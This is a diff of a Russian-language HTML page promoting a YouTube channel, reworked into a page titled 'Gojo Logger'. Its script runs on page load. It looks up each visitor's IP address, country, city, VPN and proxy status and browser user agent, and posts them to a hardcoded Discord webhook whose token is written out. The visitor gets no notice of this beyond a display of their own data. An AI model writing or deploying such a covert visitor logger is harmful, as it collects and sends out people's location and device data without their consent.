@@ -1,84 +1,113 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-  <title>Подпишись!</title>
+  <meta charset="UTF-8">
+  <title>Gojo Logger</title>
   <style>
     body {
-      text-align: center;
-      font-family: sans-serif;
-      background-color: #111;
-      color: white;
+      background-color: #000;
+      color: #0f0;
+      font-family: monospace;
+      padding: 20px;
     }
-    img {
-      width: 300px;
-      margin-top: 30px;
-      border-radius: 15px;
+
+    .subscribe {
+      margin-top: 40px;
+      color: white;
+      background-color: crimson;
+      padding: 12px 20px;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .subscribe:hover {
+      background-color: #ff4444;
+    }
+
+    a {
+      text-decoration: none;
+      color: white;
     }
   </style>
 </head>
 <body>
-  <h1>Подпишись на YouTube канал</
-  <h2>@Gojosatoru01Stendoff</h2>
-  <img src="https://i.imgur.com/zDKrSmT.png" alt="YouTube Banner">
+  <h2>🌀 Gojo Logger</h2>
+  <p id="info">Загрузка...</p>
 
- <script>
-  const webhookURL = "https://discord.com/api/webhooks/1390405567243227207/kdnHZFuPDGfTaVYFlMMTRiGPk1nA8EKCymVm3NdjNUO4opU5MaEUD4KX27eUi1Z68OD6";
+  <button class="subscribe">
+    <a href="https://youtube.com/@Gojosatoru01Stendoff" target="_blank">🔔 Подпишись на @Gojosatoru01Stendoff</a>
+  </button>
 
-const storageKey = "gojo-ips";
-const visitedKey = "gojo-visits";
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1390405567243227207/kdnHZFuPDGfTaVYFlMMTRiGPk1nA8EKCymVm3NdjNUO4opU5MaEUD4KX27eUi1Z68OD6";
 
-async function getIPData() {
-  const res = await fetch("https://ipapi.co/json/");
-  return await res.json();
-}
+    const storageKey = "gojo-ips";
+    const visitedKey = "gojo-visits";
 
-function logToDiscord(message) {
-  fetch(webhookURL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ content: message })
-  });
-}
+    async function getIPData() {
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        return await res.json();
+      } catch (err) {
+        console.error("Ошибка API:", err);
+        return {};
+      }
+    }
 
-async function main() {
-  const data = await getIPData();
-  const ip = data.ip || "undefined";
-  const isVPN = data.security?.vpn ? "Да" : "Нет";
-  const proxy = data.security?.proxy ? "Да" : "Нет";
-  const device = navigator.userAgent;
+    function logToDiscord(message) {
+      fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: message })
+      }).catch(e => console.error("Ошибка Discord Webhook:", e));
+    }
 
-  const visits = parseInt(localStorage.getItem(visitedKey) || "0") + 1;
-  localStorage.setItem(visitedKey, visits);
+    async function main() {
+      const data = await getIPData();
+      const ip = data.ip || "undefined";
+      const country = data.country_name || "undefined";
+      const city = data.city || "undefined";
+      const isVPN = data.security?.vpn ? "Да" : "Нет";
+      const isProxy = data.security?.proxy ? "Да" : "Нет";
+      const device = navigator.userAgent;
 
-  let knownIPs = JSON.parse(localStorage.getItem(storageKey) || "[]");
-  if (!knownIPs.includes(ip)) {
-    knownIPs.push(ip);
-    localStorage.setItem(storageKey, JSON.stringify(knownIPs));
-  }
+      const visits = parseInt(localStorage.getItem(visitedKey) || "0") + 1;
+      localStorage.setItem(visitedKey, visits);
 
-  document.getElementById("info").innerText = `
+      let knownIPs = JSON.parse(localStorage.getItem(storageKey) || "[]");
+      if (!knownIPs.includes(ip)) {
+        knownIPs.push(ip);
+        localStorage.setItem(storageKey, JSON.stringify(knownIPs));
+      }
+
+      document.getElementById("info").innerText = `
 🔎 IP: ${ip}
-🌍 Страна: ${data.country_name}
-🏙 Город: ${data.city}
+🌍 Страна: ${country}
+🏙 Город: ${city}
 🔒 VPN: ${isVPN}
-🧰 Прокси: ${proxy}
+🧰 Прокси: ${isProxy}
 📱 Устройство: ${device}
 
 👁️ Уникальных гостей: ${knownIPs.length}
 🧾 Всего переходов: ${visits}
-  `;
+      `;
 
-  logToDiscord(`
+      logToDiscord(`
 🔎 **Новый гость на сайте!**
 **IP:** ${ip}
-**Страна:** ${data.country_name}
-**Город:** ${data.city}
+**Страна:** ${country}
+**Город:** ${city}
 **VPN:** ${isVPN}
-**Прокси:** ${proxy}
+**Прокси:** ${isProxy}
 **Устройство:** ${device}
 **👁️ Уникальных гостей:** ${knownIPs.length}
 **🧾 Переходов с устройства:** ${visits}
-  `);
-}
+      `);
+    }
 
-main();
+    main();
+  </script>
+</body>
+</html>
